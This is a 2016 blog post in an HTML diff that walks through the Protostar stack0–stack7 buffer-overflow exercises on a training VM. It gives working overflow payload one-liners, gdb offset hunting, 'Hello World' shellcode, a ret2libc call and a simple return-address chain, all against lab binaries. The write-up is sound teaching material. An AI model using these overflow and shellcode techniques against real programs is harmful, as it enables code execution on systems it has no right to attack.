@@ -1,0 +1,481 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Protostar: Stack - tick.Tack</title>
+  <meta name="author" content="DMC">
+
+  
+  <meta name="description" content="Stack0 Since Stack0 only needs to change the modified variable to be a non-zero value. All you need to do is, to overflow the buffer variable with &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://newdominic.github.io/blog/2016/06/30/Protostar_Stack/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="tick.Tack" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">tick.Tack</a></h1>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="newdominic.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Protostar: Stack</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2016-06-30T13:06:22+08:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>30</span><span class='date-suffix'>th</span>, <span class='date-year'>2016</span></span> <span class='time'>1:06 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><!--more-->
+
+
+<h2><a href="https://exploit-exercises.com/protostar/stack0/">Stack0</a></h2>
+
+<p>Since Stack0 only needs to change the <strong>modified</strong> variable to be a non-zero value. All you need to do is, to overflow the <strong>buffer</strong> variable with more than 64 characters.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "A"*64 + "AAAA"' | ./stack0
+you have changed the 'modified' variable
+</code></pre>
+
+<h2><a href="https://exploit-exercises.com/protostar/stack1/">Stack1</a></h2>
+
+<p>Stack1 asks us to change the <strong>modified</strong> variable to a specific hexadecimal number: 0x61626364, which can be translated to ASCII as &ldquo;abcd&rdquo;. The hint says that &ldquo;Protostar is <a href="https://en.wikipedia.org/wiki/Endianness">little endian</a>&rdquo;. So we&rsquo;ll need to have the string text in reverse order.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ ./stack1 `python -c 'print "A"*64+"dcba"'`
+you have correctly got the variable to the right value
+</code></pre>
+
+<h2><a href="https://exploit-exercises.com/protostar/stack2/">Stack2</a></h2>
+
+<p>Not like Stack0 and Stack1. Stack2 reads the environment variable from the system, then use it to change the <strong>modified</strong> variable. This time we will set the GREENIE environment variable, and let the program work itself.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ export GREENIE=`python -c 'print "A"*64+"\x0a\x0d\x0a\x0d"'`
+user@protostar:/opt/protostar/bin$ ./stack2
+you have correctly modified the variable
+</code></pre>
+
+<h2><a href="https://exploit-exercises.com/protostar/stack3/">Stack3</a></h2>
+
+<p>This time, we&rsquo;re going to modify a function pointer. If we overflow the <strong>fp</strong> with a wrong <strong>address</strong>, the program might crash immediately.</p>
+
+<p>Calling the <strong>win()</strong> function is our goal. We need the <strong>fp</strong> to be overwritten with the address of <strong>win()</strong>. So our first step is to find out the address.</p>
+
+<p>There are two ways to achieve this goal. We can use <strong>objdump</strong> or <strong>gdb</strong> to read out the address.</p>
+
+<p>Using objdump:</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ objdump -D stack3 | grep -A7 win
+08048424 &lt;win&gt;:
+ 8048424:       55                      push   %ebp
+ 8048425:       89 e5                   mov    %esp,%ebp
+ 8048427:       83 ec 18                sub    $0x18,%esp
+ 804842a:       c7 04 24 40 85 04 08    movl   $0x8048540,(%esp)
+ 8048431:       e8 2a ff ff ff          call   8048360 &lt;puts@plt&gt;
+ 8048436:       c9                      leave
+ 8048437:       c3                      ret
+</code></pre>
+
+<p>Using gdb:</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ gdb -q stack3
+Reading symbols from /opt/protostar/bin/stack3...done.
+(gdb) p win
+$1 = {void (void)} 0x8048424 &lt;win&gt;
+</code></pre>
+
+<p>With both methods, we know the address of <strong>win()</strong> is 0x8048424. Now we can build our string to exploit Stack3.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "A"*64+"\x24\x84\x04\x08"' | ./stack3
+calling function pointer, jumping to 0x08048424
+code flow successfully changed
+</code></pre>
+
+<h2><a href="https://exploit-exercises.com/protostar/stack4/">Stack4</a></h2>
+
+<p>Stack4 is similar to Stack3. But this time our target has changed to0 the saved <strong>EIP</strong>.</p>
+
+<p>First we still need to find out the address of <strong>win()</strong>.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ gdb -q stack4
+Reading symbols from /opt/protostar/bin/stack4...done.
+(gdb) p win
+$1 = {void (void)} 0x80483f4 &lt;win&gt;
+</code></pre>
+
+<p>We need to use <strong>gdb</strong> to find out the offset from <strong>buffer</strong> variable to <strong>EIP</strong>. Since the program will crash while accessing an illegal address, we can build a non-repeating string to locate the offset of <strong>EIP</strong>.</p>
+
+<pre><code>python -c 'print "A"*64+"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm"' &gt; /tmp/stack4
+</code></pre>
+
+<p>After we built the string, now we can run stack4 in gdb to check the result.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ gdb -q stack4
+Reading symbols from /opt/protostar/bin/stack4...done.
+(gdb) run &lt; /tmp/stack4
+Starting program: /opt/protostar/bin/stack4 &lt; /tmp/stack4
+
+Program received signal SIGSEGV, Segmentation fault.
+0x48474644 in ?? ()
+(gdb) p $eip
+$1 = (void (*)()) 0x48474644
+</code></pre>
+
+<p>Here we can see that stack4 crashed when the EIP pointed to 0x48474644, which is the reverse order of the string &ldquo;DFGH&rdquo;. Now we know the offset from the end of <strong>buffer</strong> variable to <strong>EIP</strong> is 12. It&rsquo;s time to build the final string and run against stack4.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "A"*64+"B"*12+"\xf4\x83\x04\x08"' | ./stack4
+code flow successfully changed
+Segmentation fault
+</code></pre>
+
+<p>We have successfully called the <strong>win()</strong> function, but the program still crashed. That is because, although we direct the flow to <strong>win()</strong>, it still needs an appropriate return address while exiting from <strong>win()</strong>. We will discuss this issue later.</p>
+
+<h2><a href="https://exploit-exercises.com/protostar/stack5/">Stack5</a></h2>
+
+<p>In Stack5, we don&rsquo;t have any targets to direct to. This is where the shellcode comes in. As the hint says, it might be easier to use someone elses shellcode. I&rsquo;ll use a shellcode I found <a href="http://stackoverflow.com/questions/15593214/linux-shellcode-hello-world">here</a>, which prints &ldquo;Hello World!&rdquo; to screen.</p>
+
+<p>Let&rsquo;s begin with finding the offset to EIP. We&rsquo;ll use the same non-repeating string from Stack4 for it.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ gdb -q stack5
+Reading symbols from /opt/protostar/bin/stack5...done.
+(gdb) run &lt; /tmp/stack4
+Starting program: /opt/protostar/bin/stack5 &lt; /tmp/stack4
+
+Program received signal SIGSEGV, Segmentation fault.
+0x48474644 in ?? ()
+</code></pre>
+
+<p>The result is the same as Stack4, the offset to EIP is still 12. But, what value should we put in EIP?</p>
+
+<p>This time, we will put our shellcode in the <strong>buffer</strong> variable, and direct the EIP to point to the address of it. Once the EIP hit the address of <strong>buffer</strong>, it will run our shellcode as we expected.</p>
+
+<p>We can find the address of <strong>buffer</strong> by setting a breakpoint in main. Let&rsquo;s set the breakpoint right before the <strong>gets()</strong> get called.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ gdb -q stack5
+Reading symbols from /opt/protostar/bin/stack5...done.
+(gdb) disas main
+Dump of assembler code for function main:
+0x080483c4 &lt;main+0&gt;:    push   %ebp
+0x080483c5 &lt;main+1&gt;:    mov    %esp,%ebp
+0x080483c7 &lt;main+3&gt;:    and    $0xfffffff0,%esp
+0x080483ca &lt;main+6&gt;:    sub    $0x50,%esp
+0x080483cd &lt;main+9&gt;:    lea    0x10(%esp),%eax
+0x080483d1 &lt;main+13&gt;:   mov    %eax,(%esp)
+0x080483d4 &lt;main+16&gt;:   call   0x80482e8 &lt;gets@plt&gt;
+0x080483d9 &lt;main+21&gt;:   leave
+0x080483da &lt;main+22&gt;:   ret
+End of assembler dump.
+(gdb) b *0x080483d4
+Breakpoint 1 at 0x80483d4: file stack5/stack5.c, line 10.
+(gdb) r
+Starting program: /opt/protostar/bin/stack5
+
+Breakpoint 1, 0x080483d4 in main (argc=1, argv=0xbffff824) at stack5/stack5.c:10
+10      stack5/stack5.c: No such file or directory.
+        in stack5/stack5.c
+(gdb) p &amp;buffer
+$1 = (char (*)[64]) 0xbffff788
+</code></pre>
+
+<p>Now we have the address of <strong>buffer</strong>: 0xbffff788. We can build the final string and run against Stack5.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "\xe9\x1e\x00\x00\x00\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x59\xba\x0f\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xdd\xff\xff\xffHello world!"+"\x00"*12+"B"*12+"\x88\xf7\xff\xbf"' | ./stack5
+Hello world!
+</code></pre>
+
+<h2><a href="https://exploit-exercises.com/protostar/stack6/">Stack6</a></h2>
+
+<p>This time, we have a restriction on the return address. The first byte of return address cannot be <strong>0xbf</strong>.</p>
+
+<p>Let&rsquo;s get the address of <strong>buffer</strong> and the EIP first.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ gdb -q stack6
+Reading symbols from /opt/protostar/bin/stack6...done.
+(gdb) run &lt; /tmp/stack4
+Starting program: /opt/protostar/bin/stack6 &lt; /tmp/stack4
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJKLZTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm
+
+Program received signal SIGSEGV, Segmentation fault.
+0x5a4c4b4a in ?? ()
+</code></pre>
+
+<p>&ldquo;0x5a4c4b4a&rdquo; is &ldquo;JKLZ&rdquo; in reverse order. The offset here is 16.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ gdb -q stack6
+Reading symbols from /opt/protostar/bin/stack6...done.
+(gdb) disas getpath
+Dump of assembler code for function getpath:
+0x08048484 &lt;getpath+0&gt;: push   %ebp
+0x08048485 &lt;getpath+1&gt;: mov    %esp,%ebp
+0x08048487 &lt;getpath+3&gt;: sub    $0x68,%esp
+0x0804848a &lt;getpath+6&gt;: mov    $0x80485d0,%eax
+0x0804848f &lt;getpath+11&gt;:        mov    %eax,(%esp)
+0x08048492 &lt;getpath+14&gt;:        call   0x80483c0 &lt;printf@plt&gt;
+0x08048497 &lt;getpath+19&gt;:        mov    0x8049720,%eax
+0x0804849c &lt;getpath+24&gt;:        mov    %eax,(%esp)
+0x0804849f &lt;getpath+27&gt;:        call   0x80483b0 &lt;fflush@plt&gt;
+0x080484a4 &lt;getpath+32&gt;:        lea    -0x4c(%ebp),%eax
+0x080484a7 &lt;getpath+35&gt;:        mov    %eax,(%esp)
+0x080484aa &lt;getpath+38&gt;:        call   0x8048380 &lt;gets@plt&gt;
+---snip---
+(gdb) b *0x080484aa
+Breakpoint 1 at 0x80484aa: file stack6/stack6.c, line 13.
+(gdb) run
+Starting program: /opt/protostar/bin/stack6
+input path please:
+Breakpoint 1, 0x080484aa in getpath () at stack6/stack6.c:13
+13      stack6/stack6.c: No such file or directory.
+        in stack6/stack6.c
+(gdb) p &amp;buffer
+$1 = (char (*)[64]) 0xbffff6fc
+</code></pre>
+
+<p>The address of <strong>buffer</strong> is &ldquo;0xbffff6fc&rdquo;. Now let&rsquo;s build the string to run the &ldquo;Hello World!&rdquo; shellcode.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "\xe9\x1e\x00\x00\x00\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x59\xba\x0f\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xdd\xff\xff\xffHello world!"+"\x00"*12+"B"*16+"\xfc\xf6\xff\xbf"' | ./stack6
+input path please: bzzzt (0xbffff71c)
+</code></pre>
+
+<p>Oops! We are caught using return address starts with <strong>0xbf</strong>.</p>
+
+<p>Stack6 can be done in a couple ways:</p>
+
+<ol>
+<li>finding the duplicate of payload.</li>
+<li>ret2libc (Return to LibC)</li>
+<li>ROP (Return Oriented Programming)</li>
+</ol>
+
+
+<p>I&rsquo;ll use &ldquo;Return to LibC&rdquo; to exploit in this case.</p>
+
+<p><strong>Ret2LibC</strong></p>
+
+<p>I&rsquo;ll make the program to print out &ldquo;Hello World!&rdquo; with the <strong>write()</strong> function. First of all, we need to know the address of <strong>write()</strong>.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ gdb stack6 -q
+Reading symbols from /opt/protostar/bin/stack6...done.
+(gdb) b main
+Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
+(gdb) run
+Starting program: /opt/protostar/bin/stack6
+
+Breakpoint 1, main (argc=1, argv=0xbffff804) at stack6/stack6.c:27
+27      stack6/stack6.c: No such file or directory.
+        in stack6/stack6.c
+(gdb) p write
+$1 = {&lt;text variable, no debug info&gt;} 0xb7f53c70 &lt;write&gt;
+</code></pre>
+
+<p>By returing to <strong>write()</strong>, we&rsquo;ll need to make the call stack looks like a real function call.</p>
+
+<pre><code>write(1, "Hello World!");
+</code></pre>
+
+<p>The first parameter &ldquo;1&rdquo; stands for STDOUT, so the string will be directly printed out on the screen. And the second parameter will be the address pointed to the string we want. Now let&rsquo;s build the final payload.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "Hello World!\n"+"\x00"*67+"\x70\x3c\xf5\xb7"+"\xfc\xf6\xff\xbf"+"\x01\x00\x00\x00"' | ./stack6
+input path please: got path Hello World!
+</code></pre>
+
+<h2><a href="https://exploit-exercises.com/protostar/stack7/">Stack7</a></h2>
+
+<p>The restriction on Stack7 became a nightmare, we can&rsquo;t even return to address starts with <strong>0xb</strong>. This time, we will solve Stack7 with ROP attack.</p>
+
+<p>Just like we have done many times, it&rsquo;s easy to dig out the address of <strong>buffer</strong>: &ldquo;0xbffff78c&rdquo;. The most important thing is, we need some &ldquo;gadget&rdquo; to return to our shellcode. And we can do it just by reading the output of <strong>objdump</strong>.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ objdump -D stack7 |grep -A 7 main
+--snip--
+08048545 &lt;main&gt;:
+ 8048545:       55                      push   %ebp
+ 8048546:       89 e5                   mov    %esp,%ebp
+ 8048548:       83 e4 f0                and    $0xfffffff0,%esp
+ 804854b:       e8 74 ff ff ff          call   80484c4 &lt;getpath&gt;
+ 8048550:       89 ec                   mov    %ebp,%esp
+ 8048552:       5d                      pop    %ebp
+ 8048553:       c3                      ret
+</code></pre>
+
+<p>Usually, ROP attack is composed with bunch of &ldquo;gadgets&rdquo; - machine instruction sequences ends with <strong>return</strong> instruction. But, since Stack7 is not that complicated, the return instruction here just suits our needs.</p>
+
+<p>We can re-use the payload from Stack5, just need to insert the address of the <strong>return</strong> instruction right before the address of <strong>buffer</strong>.</p>
+
+<pre><code>user@protostar:/opt/protostar/bin$ python -c 'print "\xe9\x1e\x00\x00\x00\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x59\xba\x0f\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xdd\xff\xff\xffHello world!"+"\x00"*12+"B"*16+"\x53\x85\x04\x08"+"\x8c\xf7\xff\xbf"' |  ./stack7 -s
+input path please: got path ▒
+Hello world!
+</code></pre>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">DMC</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2016-06-30T13:06:22+08:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>30</span><span class='date-suffix'>th</span>, <span class='date-year'>2016</span></span> <span class='time'>1:06 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/protostar/'>protostar</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://newdominic.github.io/blog/2016/06/30/Protostar_Stack/" data-via="newdominic" data-counturl="http://newdominic.github.io/blog/2016/06/30/Protostar_Stack/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2016/06/29/PWK_and_OSCP/" title="Previous Post: Offensive Security Certified Professional">&laquo; Offensive Security Certified Professional</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2016/07/01/Protostar_Format/" title="Next Post: Protostar: Format">Protostar: Format &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <p><a href="https://facebook.com/newdominic"><img src="/images/facebook.png" width="30" height="30"></a>
+<a href="https://twitter.com/newdominic"><img src="/images/twitter.png" width="30" height="30"></a></p>
+  <p><a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/"><img src="/images/oscp.png" width="250" height="32"></a></p>
+</section>
+<section>
+  <h1>Recent posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/07/01/Protostar_Format/">Protostar: Format</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/06/30/Protostar_Stack/">Protostar: Stack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/06/29/PWK_and_OSCP/">Offensive Security Certified Professional</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/06/20/droopyv0.2/">Droopy: v0.2</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/06/18/vulnosv2/">VulnOS: 2</a>
+      </li>
+    
+  </ul>
+</section>
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - DMC -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
